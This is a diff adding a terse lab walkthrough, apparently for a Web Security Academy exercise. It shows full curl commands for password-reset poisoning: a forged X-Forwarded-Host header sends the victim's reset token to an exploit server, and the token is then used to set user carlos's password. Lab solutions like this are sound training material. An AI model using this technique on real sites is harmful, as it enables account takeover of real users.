@@ -1,0 +1,29 @@
+
+
+check flow of the changing password and use X-Forwarded-Host header to header poisoninng
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net' -H $'X-Forwarded-Host: exploit-0abe001f035bd4b68407b3d501860071.exploit-server.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 15' -H $'Origin: https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net' -H $'Referer: https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=JPAlG8GKsfmWN3uS3waDVghhDHXU74gN' \
+    --data-binary $'username=carlos' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password'
+	
+	
+and wait ti carlos see that and send that sessionId for us
+and use sessionId to send thos request
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://exploit-0abe001f035bd4b68407b3d501860071.exploit-server.net/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: cross-site' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=5vjs8ul4flil3imvjg72k8cqen165967' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password?temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967'
+	
+	after that send change password request
+	
+	curl -i -s -k -X $'POST' \
+    -H $'Host: 0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 107' -H $'Origin: https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net' -H $'Referer: https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password?temp-forgot-password-token=69pkd65kvqb43qsxesr39yjnjqxbytye' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=5vjs8ul4flil3imvjg72k8cqen165967' \
+    --data-binary $'temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967&new-password-1=password&new-password-2=password' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password?temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967'
+	
+	now we can login wtih
+		carlos:password
